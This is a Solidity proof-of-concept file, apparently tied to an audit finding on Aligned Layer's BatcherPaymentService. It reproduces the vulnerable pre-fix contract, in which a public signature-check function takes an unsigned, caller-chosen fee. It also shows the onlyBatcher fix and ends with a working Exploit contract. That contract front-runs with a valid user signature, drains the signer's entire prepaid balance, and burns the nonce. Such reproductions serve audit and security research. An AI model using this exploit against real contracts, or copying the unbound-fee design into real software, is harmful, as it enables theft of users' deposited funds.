// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// =============================================================================
//  Aligned Layer - public checkMerkleRootAndVerifySignatures
//  (ConsenSys Diligence, 2024-08 aligned-layer, BatcherPaymentService.sol).
//
//  createNewTask is onlyBatcher and builds feePerProof = gasPerProof * gasprice.
//  checkMerkleRootAndVerifySignatures is public and takes feePerProof from the
//  caller. The user signature is keccak256(abi.encodePacked(leaf, nonce)) and
//  does NOT bind feePerProof. Anyone who sees a valid signature can front-run
//  the batcher, pass feePerProof = the user's whole prepaid balance, zero that
//  balance, and bump the nonce so the real createNewTask reverts.
//
//  The public function and verifySignatureAndDecreaseBalance are reproduced
//  from the pre-fix contract (marked @>). harness_priorDeposit only records
//  the user's earlier receive() payment so this file stays cheatcode-free.
// =============================================================================

// Anvil account 0. Signature is a raw ecrecover over keccak256(leaf0, nonce 0).
address constant USER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
uint256 constant PREPAID = 500 ether;
bytes32 constant LEAF0 = 0x17db940fc8a42eace0e9e73aeacadf98d566256ac7afff3eb0b14ad950ce8ff6;
uint8 constant SIG_V = 28;
bytes32 constant SIG_R = 0x348d08fede3e4bc53482dda08f877df481e744c39f6675be9d81dc4b9f7194eb;
bytes32 constant SIG_S = 0x1af366f272717fdfd0b69d1cc98db6a6bc83c4e5ab49191ec58d95051a4b270e;

contract BatcherPaymentService {
    uint256 public constant UNLOCK_BLOCK_COUNT = 100;

    event PaymentReceived(address indexed sender, uint256 amount);

    struct SignatureData {
        uint8 v;
        bytes32 r;
        bytes32 s;
        uint256 nonce;
    }

    struct UserInfo {
        uint256 balance;
        uint256 unlockBlock;
        uint256 nonce;
    }

    address public batcher;
    mapping(address => UserInfo) public UserData;

    event FundsWithdrawn(address indexed recipient, uint256 amount);

    modifier onlyBatcher() {
        require(msg.sender == batcher, "Only Batcher can call this function");
        _;
    }

    receive() external payable {
        UserData[msg.sender].balance += msg.value;
        emit PaymentReceived(msg.sender, msg.value);
    }

    // Harness: same accounting as receive(), but the payer is the recovered signer.
    function harness_priorDeposit(address user) external payable {
        UserData[user].balance += msg.value;
        emit PaymentReceived(user, msg.value);
    }

    // @> VULN: public, no onlyBatcher. feePerProof is a caller argument, not signed.
    function checkMerkleRootAndVerifySignatures(
        bytes32[] calldata leaves,
        bytes32 batchMerkleRoot,
        SignatureData[] calldata signatures,
        uint256 feePerProof
    ) public virtual { // @> VULN: no onlyBatcher; feePerProof is a free argument
        _checkMerkleRootAndVerifySignatures(leaves, batchMerkleRoot, signatures, feePerProof);
    }

    function _checkMerkleRootAndVerifySignatures(
        bytes32[] calldata leaves,
        bytes32 batchMerkleRoot,
        SignatureData[] calldata signatures,
        uint256 feePerProof
    ) internal {
        uint256 numNodesInLayer = leaves.length / 2;
        bytes32[] memory layer = new bytes32[](numNodesInLayer);

        uint32 i = 0;

        // Hash the next Merkle layer and verify signatures up to numNodesInLayer.
        for (i = 0; i < numNodesInLayer; i++) {
            layer[i] = keccak256(abi.encodePacked(leaves[2 * i], leaves[2 * i + 1]));

            verifySignatureAndDecreaseBalance(leaves[i], signatures[i], feePerProof);
        }

        for (; i < signatures.length; i++) {
            verifySignatureAndDecreaseBalance(leaves[i], signatures[i], feePerProof);
        }

        numNodesInLayer /= 2;

        while (numNodesInLayer != 0) {
            for (i = 0; i < numNodesInLayer; i++) {
                layer[i] = keccak256(abi.encodePacked(layer[2 * i], layer[2 * i + 1]));
            }
            numNodesInLayer /= 2;
        }

        if (leaves.length == 1) {
            require(leaves[0] == batchMerkleRoot, "Invalid merkle root");
        } else {
            require(layer[0] == batchMerkleRoot, "Invalid merkle root");
        }
    }

    function verifySignatureAndDecreaseBalance(bytes32 hash, SignatureData calldata signatureData, uint256 feePerProof)
        private
    {
        // Signed digest is (leaf, nonce). feePerProof is not in the hash.
        bytes32 noncedHash = keccak256(abi.encodePacked(hash, signatureData.nonce));

        address signer = ecrecover(noncedHash, signatureData.v, signatureData.r, signatureData.s);

        UserInfo storage user_data = UserData[signer];

        require(user_data.nonce == signatureData.nonce, "Invalid Nonce");
        user_data.nonce++;

        require(user_data.balance >= feePerProof, "Signer has insufficient balance");

        user_data.balance -= feePerProof; // @> VULN: caller-chosen feePerProof drains the signer
    }

    function withdraw(uint256 amount) external {
        UserInfo storage user_data = UserData[msg.sender];
        require(user_data.balance >= amount, "Payer has insufficient balance");
        require(user_data.unlockBlock != 0 && user_data.unlockBlock <= block.number, "Funds are locked");
        user_data.balance -= amount;
        payable(msg.sender).transfer(amount);
        emit FundsWithdrawn(msg.sender, amount);
    }

    function user_balances(address account) public view returns (uint256) {
        return UserData[account].balance;
    }

    function user_nonces(address account) public view returns (uint256) {
        return UserData[account].nonce;
    }
}

// Fix from PR 801: the check is not permissionless. Production made it private;
// onlyBatcher is the same gate createNewTask already had.
contract BatcherPaymentServiceFixed is BatcherPaymentService {
    constructor(address _batcher) {
        batcher = _batcher;
    }

    function checkMerkleRootAndVerifySignatures(
        bytes32[] calldata leaves,
        bytes32 batchMerkleRoot,
        SignatureData[] calldata signatures,
        uint256 feePerProof
    ) public override onlyBatcher {
        _checkMerkleRootAndVerifySignatures(leaves, batchMerkleRoot, signatures, feePerProof);
    }
}

contract DrainedMarker {
    string public symbol = "DRAINED-ETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    BatcherPaymentService public svc;
    DrainedMarker public drained;

    // run() creates BatcherPaymentService (nonce 1) then DrainedMarker (nonce 2).
    function run() external payable {
        svc = new BatcherPaymentService();
        drained = new DrainedMarker();

        require(LEAF0 == keccak256("aligned-proof"), "leaf");

        bytes32 leaf0 = keccak256("aligned-proof");
        bytes32 leaf1 = keccak256("aligned-pad");
        bytes32 root = keccak256(abi.encodePacked(leaf0, leaf1));

        bytes32 nonced = keccak256(abi.encodePacked(leaf0, uint256(0)));
        address signer = ecrecover(nonced, SIG_V, SIG_R, SIG_S);
        require(signer == USER, "signer");

        svc.harness_priorDeposit{value: PREPAID}(signer);

        bytes32[] memory leaves = new bytes32[](2);
        leaves[0] = leaf0;
        leaves[1] = leaf1;

        BatcherPaymentService.SignatureData[] memory signatures = new BatcherPaymentService.SignatureData[](1);
        signatures[0] = BatcherPaymentService.SignatureData({v: SIG_V, r: SIG_R, s: SIG_S, nonce: 0});

        uint256 beforeBal = svc.user_balances(signer);
        svc.checkMerkleRootAndVerifySignatures(leaves, root, signatures, beforeBal);

        uint256 afterBal = svc.user_balances(signer);
        uint256 lost = beforeBal - afterBal;
        require(lost == PREPAID, "not fully drained");
        require(afterBal == 0, "balance not zero");
        require(svc.user_nonces(signer) == 1, "nonce");
        require(address(svc).balance == PREPAID, "eth not stuck");

        // Same signature cannot be reused: the nonce was burned.
        bool replayed;
        try svc.checkMerkleRootAndVerifySignatures(leaves, root, signatures, 1 ether) {
            replayed = true;
        } catch {
            replayed = false;
        }
        require(!replayed, "nonce not burned");

        drained.mint(SINK, lost);
    }
}
